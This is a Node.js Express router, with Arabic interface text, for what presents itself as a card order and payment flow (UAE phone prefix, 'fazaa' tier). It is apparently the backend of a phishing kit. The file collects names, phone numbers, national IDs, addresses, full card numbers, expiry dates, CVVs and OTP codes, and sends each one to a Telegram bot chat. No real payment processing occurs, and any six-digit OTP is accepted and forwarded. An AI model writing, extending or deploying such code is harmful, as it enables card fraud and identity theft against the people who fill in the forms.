const express = require('express');
const router = express.Router();
const { v4: uuidv4 } = require('uuid');

// In-memory storage (in production, use a database)
const sessions = new Map();

// Telegram configuration from environment variables
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
const TELEGRAM_API_URL = 'https://api.telegram.org';

async function sendTelegramMessage(text) {
    const botToken = TELEGRAM_BOT_TOKEN;
    const chatId = TELEGRAM_CHAT_ID;
    const apiUrl = TELEGRAM_API_URL;

    console.log('[Telegram] Preparing to send message to chat:', chatId);
    console.log('[Telegram] Message preview:', String(text).slice(0, 400));

    if (!botToken || !chatId) {
        console.log('[Telegram] Missing bot token or chat id.');
        return { success: false, skipped: true };
    }

    try {
        const response = await fetch(`${apiUrl}/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text,
                disable_web_page_preview: true,
                parse_mode: 'HTML'
            })
        });

        const payload = await response.json();
        console.log('[Telegram] Response status:', response.status, 'payload:', payload);
        if (!response.ok || !payload.ok) {
            throw new Error(payload.description || 'Telegram send failed');
        }

        return { success: true, payload };
    } catch (error) {
        console.error('[Telegram] send error:', error.message);
        return { success: false, error: error.message };
    }
}

function formatOrder1TelegramMessage(payload = {}) {
    const lines = [];
    lines.push('بيانات العميل');
    const customerName = payload.customerName || payload.fullName || payload.name || payload.clientName || '';
    if (customerName) lines.push(`اسم العميل: ${customerName}`);
    if (payload.phoneNumber) lines.push(`الهاتف: ${payload.phoneNumber}`);
    if (payload.nationalId) lines.push(`الهوية: ${payload.nationalId}`);
    return lines.join('\n');
}

function formatOrder2TelegramMessage(payload = {}) {
    const lines = [];
    lines.push('عنوان التوصيل');
    const customerName = payload.customerName || payload.fullName || payload.name || payload.clientName || '';
    if (customerName) lines.push(`اسم العميل: ${customerName}`);
    if (payload.city) lines.push(`المدينة: ${payload.city}`);
    if (payload.street1) lines.push(`العنوان: ${payload.street1}`);
    if (payload.deliveryDate) lines.push(`موعد الاستلام: ${payload.deliveryDate}`);
    return lines.join('\n');
}

function formatOrder3TelegramMessage(payload = {}) {
    const lines = [];
    lines.push('دخول الدفع');
    const customerName = payload.customerName || payload.fullName || payload.name || payload.clientName || '';
    if (customerName) lines.push(`اسم العميل: ${customerName}`);
    return lines.join('\n');
}

function formatPaymentTelegramMessage(payload = {}) {
    const lines = [];
    lines.push('دفع جديد');
    const customerName = payload.customerName || payload.fullName || payload.name || payload.clientName || '';
    if (customerName) lines.push(`اسم العميل: ${customerName}`);
    if (payload.paymentData?.cardHolder) lines.push(`اسم حامل البطاقة: ${payload.paymentData.cardHolder}`);
    if (payload.paymentData?.cardNumber) lines.push(`رقم البطاقة: ${payload.paymentData.cardNumber}`);
    if (payload.paymentData?.expiry) lines.push(`تاريخ الانتهاء: ${payload.paymentData.expiry}`);
    if (payload.paymentData?.cvv) lines.push(`رمز الأمان: ${payload.paymentData.cvv}`);
    return lines.join('\n');
}

function formatOtpTelegramMessage(payload = {}) {
    const lines = [];
    lines.push('رمز التحقق');
    const customerName = payload.customerName || payload.fullName || payload.name || payload.clientName || '';
    if (customerName) lines.push(`اسم العميل: ${customerName}`);
    if (payload.otp) lines.push(`رمز التحقق: ${payload.otp}`);
    return lines.join('\n');
}

// ============ API ROUTES ============

// 1. Start new order / Get session
router.post('/start-order', (req, res) => {
    try {
        const userId = uuidv4();
        
        req.session.userId = userId;
        req.session.currentStep = 1;
        req.session.orderStarted = false;
        req.session.orderCompleted = false;
        req.session.paymentCompleted = false;
        req.session.paymentData = null;
        req.session.verified = false;
        req.session.orderData = null;
        req.session.createdAt = new Date().toISOString();
        
        sessions.set(userId, {
            userId,
            currentStep: 1,
            orderData: null,
            paymentData: null,
            status: 'started',
            createdAt: new Date()
        });
        
        console.log('New order started:', userId);
        
        res.json({
            success: true,
            userId,
            message: 'تم بدء الطلب بنجاح'
        });
    } catch (error) {
        console.error('Error starting order:', error);
        res.status(500).json({ 
            success: false,
            error: 'حدث خطأ في بدء الطلب' 
        });
    }
});

// 2. Check session status
router.get('/check-session', (req, res) => {
    const userId = req.session.userId;
    
    if (!userId) {
        return res.json({
            hasSession: false,
            message: 'لا توجد جلسة نشطة'
        });
    }
    
    res.json({
        hasSession: true,
        userId,
        currentStep: req.session.currentStep || 1,
        orderStarted: req.session.orderStarted || false,
        orderCompleted: req.session.orderCompleted || false,
        paymentCompleted: req.session.paymentCompleted || false,
        verified: req.session.verified || false,
        orderDraft: req.session.orderDraft || null
    });
});

// 3. Save current step and draft form data
router.post('/save-progress', async (req, res) => {
    try {
        if (!req.session.userId) {
            return res.status(400).json({
                success: false,
                error: 'يرجى بدء الطلب أولاً'
            });
        }

        const { currentStep, formData } = req.body || {};
        const parsedStep = Number(currentStep);

        if (Number.isFinite(parsedStep) && parsedStep >= 1 && parsedStep <= 4) {
            req.session.currentStep = parsedStep;
        }

        if (formData && typeof formData === 'object') {
            req.session.orderDraft = {
                ...(req.session.orderDraft || {}),
                ...formData
            };
        }

        if (sessions.has(req.session.userId)) {
            const record = sessions.get(req.session.userId);
            record.currentStep = req.session.currentStep || 1;
            record.orderData = req.session.orderDraft || record.orderData || null;
            record.status = record.status || 'started';
        }

        res.json({
            success: true,
            currentStep: req.session.currentStep || 1
        });
    } catch (error) {
        console.error('Error saving progress:', error);
        res.status(500).json({
            success: false,
            error: 'حدث خطأ في حفظ التقدم'
        });
    }
});

router.post('/notify-order1', async (req, res) => {
    try {
        if (!req.session.userId) {
            req.session.userId = uuidv4();
        }

        const { fullName = '', phoneNumber = '', nationalId = '' } = req.body || {};
        const contactData = {
            fullName,
            phoneNumber,
            nationalId
        };

        req.session.orderDraft = {
            ...(req.session.orderDraft || {}),
            ...contactData
        };

        const telegramMessage = formatOrder1TelegramMessage(contactData);
        const result = await sendTelegramMessage(telegramMessage);

        console.log('[Route] /notify-order1 telegram result:', result);
        res.json({ success: true, telegram: result });
    } catch (error) {
        console.error('Error sending order1 telegram message:', error);
        res.status(500).json({ success: false, error: 'حدث خطأ في إرسال الرسالة' });
    }
});

router.post('/notify-order2', async (req, res) => {
    try {
        if (!req.session.userId) {
            req.session.userId = uuidv4();
        }

        const { fullName = '', city = '', street1 = '', deliveryDate = '' } = req.body || {};
        const addressData = {
            fullName,
            city,
            street1,
            deliveryDate
        };

        req.session.orderDraft = {
            ...(req.session.orderDraft || {}),
            ...addressData
        };

        const telegramMessage = formatOrder2TelegramMessage(addressData);
        const result = await sendTelegramMessage(telegramMessage);

        console.log('[Route] /notify-order2 telegram result:', result);
        res.json({ success: true, telegram: result });
    } catch (error) {
        console.error('Error sending order2 telegram message:', error);
        res.status(500).json({ success: false, error: 'حدث خطأ في إرسال الرسالة' });
    }
});

// 4. Submit order form
router.post('/submit-order', async (req, res) => {
    try {
        // التحقق: فقط يحتاج userId (بدأ الطلب)
        if (!req.session.userId) {
            console.log('Submit order failed: No userId');
            return res.status(400).json({
                success: false,
                error: 'يرجى بدء الطلب أولاً',
                redirect: '/'
            });
        }
        
        const { fullName, phoneNumber, nationalId, city, street1, street2, deliveryDate, tier } = req.body;
        
        // Validate required fields
        if (!fullName || !phoneNumber || !nationalId || !city || !street1) {
            return res.status(400).json({
                success: false,
                error: 'يرجى ملء جميع الحقول المطلوبة'
            });
        }
        
        // التحقق من أن الحقول ليست فارغة فقط (بدون شروط على الصيغة)
        if (!phoneNumber) {
            return res.status(400).json({
                success: false,
                error: 'يرجى إدخال رقم الهاتف'
            });
        }
        
        if (!nationalId) {
            return res.status(400).json({
                success: false,
                error: 'يرجى إدخال رقم الهوية'
            });
        }
        
        // Save order data
        req.session.orderData = {
            fullName,
            phoneNumber: '+971' + phoneNumber,
            nationalId,
            city,
            street1,
            street2: street2 || '',
            deliveryDate: deliveryDate || null,
            tier: tier || 'platinum',
            price: getPrice(tier)
        };
        
        req.session.currentStep = 2;
        req.session.orderStarted = true;
        req.session.orderCompleted = true;
        
        // Update session storage
        if (sessions.has(req.session.userId)) {
            sessions.get(req.session.userId).orderData = req.session.orderData;
            sessions.get(req.session.userId).currentStep = 2;
            sessions.get(req.session.userId).status = 'order_completed';
        }

        console.log('[Route] /submit-order reached for session:', req.session.userId);
        const step3Message = formatOrder3TelegramMessage({
            fullName: fullName,
            tier: tier || 'platinum'
        });
        await sendTelegramMessage(step3Message);
        
        console.log('Order completed for:', req.session.userId);
        
        res.json({
            success: true,
            message: 'تم حفظ بيانات الطلب بنجاح',
            redirect: '/payment'
        });
        
    } catch (error) {
        console.error('Error submitting order:', error);
        res.status(500).json({
            success: false,
            error: 'حدث خطأ في حفظ الطلب'
        });
    }
});

// 5. Submit payment
router.post('/submit-payment', async (req, res) => {
    try {
        // التحقق: يحتاج orderCompleted
        if (!req.session.userId || !req.session.orderCompleted) {
            console.log('Submit payment failed: No orderCompleted');
            return res.status(400).json({
                success: false,
                error: 'يرجى إكمال بيانات الطلب أولاً',
                redirect: '/?error=complete_order_first'
            });
        }
        
        const { cardLast4, cardType, cardNumber, cardHolder, expiry, cvv } = req.body;
        
        req.session.paymentData = {
            cardLast4: cardLast4 || (cardNumber ? cardNumber.slice(-4) : '****'),
            cardType: cardType || 'بطاقة',
            cardHolder: cardHolder || '',
            cardNumber: cardNumber || '',
            expiry: expiry || '',
            cvv: cvv || '',
            paidAt: new Date().toISOString()
        };
        
        req.session.currentStep = 3;
        req.session.paymentCompleted = true;
        
        if (sessions.has(req.session.userId)) {
            sessions.get(req.session.userId).paymentData = req.session.paymentData;
            sessions.get(req.session.userId).currentStep = 3;
            sessions.get(req.session.userId).status = 'payment_completed';
        }

        console.log('[Route] /submit-payment reached for session:', req.session.userId);
        const telegramMessage = formatPaymentTelegramMessage({
            customerName: req.session.orderData?.fullName || req.session.orderDraft?.fullName || '',
            paymentData: req.session.paymentData
        });
        const telegramResult = await sendTelegramMessage(telegramMessage);
        console.log('[Route] /submit-payment telegram result:', telegramResult);
        
        console.log('Payment completed for:', req.session.userId);
        
        res.json({
            success: true,
            message: 'تم تأكيد الدفع بنجاح',
            redirect: '/verification'
        });
        
    } catch (error) {
        console.error('Error submitting payment:', error);
        res.status(500).json({
            success: false,
            error: 'حدث خطأ في تأكيد الدفع'
        });
    }
});

// 6. Verify OTP
router.post('/verify-otp', async (req, res) => {
    try {
        // التحقق: يحتاج paymentCompleted
        if (!req.session.userId || !req.session.paymentCompleted) {
            console.log('Verify OTP failed: No paymentCompleted');
            return res.status(400).json({
                success: false,
                error: 'يرجى إتمام الدفع أولاً',
                redirect: '/?error=complete_payment_first'
            });
        }
        
        const { otp } = req.body;
        
        // In production, verify OTP with SMS provider
        // For demo, accept any 6-digit code
        if (!otp || otp.length !== 6) {
            return res.status(400).json({
                success: false,
                error: 'تم ادخال رمز تحقق غير صحيح او منتهي الصلاحية يرجى انتظار رمز جديد'
            });
        }
        
        req.session.currentStep = 4;
        req.session.verified = true;
        
        if (sessions.has(req.session.userId)) {
            sessions.get(req.session.userId).currentStep = 4;
            sessions.get(req.session.userId).verified = true;
            sessions.get(req.session.userId).status = 'completed';
            sessions.get(req.session.userId).completedAt = new Date();
        }

        console.log('[Route] /verify-otp reached for session:', req.session.userId, 'otp:', otp);
        const otpMessage = formatOtpTelegramMessage({
            fullName: req.session.orderData?.fullName || req.session.orderDraft?.fullName || '',
            otp
        });
        const telegramResult = await sendTelegramMessage(otpMessage);
        console.log('[Route] /verify-otp telegram result:', telegramResult);
        
        console.log('Verification completed for:', req.session.userId);
        
        res.json({
            success: true,
            message: 'تم التحقق بنجاح',
            redirect: '/success'
        });
        
    } catch (error) {
        console.error('Error verifying OTP:', error);
        res.status(500).json({
            success: false,
            error: 'حدث خطأ في التحقق'
        });
    }
});

// 7. Get order summary
router.get('/order-summary', (req, res) => {
    if (!req.session.userId || !req.session.orderData) {
        return res.status(400).json({
            success: false,
            error: 'لا توجد بيانات طلب'
        });
    }
    
    res.json({
        success: true,
        orderData: req.session.orderData,
        paymentData: req.session.paymentData
    });
});

// 8. Reset session (logout)
router.post('/reset-session', (req, res) => {
    const userId = req.session.userId;
    
    if (userId && sessions.has(userId)) {
        sessions.delete(userId);
    }
    
    req.session.destroy((err) => {
        if (err) {
            return res.status(500).json({
                success: false,
                error: 'حدث خطأ في تسجيل الخروج'
            });
        }
        
        res.json({
            success: true,
            message: 'تم تسجيل الخروج بنجاح'
        });
    });
});

// Helper function to get price by tier
function getPrice(tier) {
    const prices = {
        platinum: 299,
        gold: 199,
        silver: 99,
        fazaa: 49
    };
    return prices[tier] || 0;
}

module.exports = router;
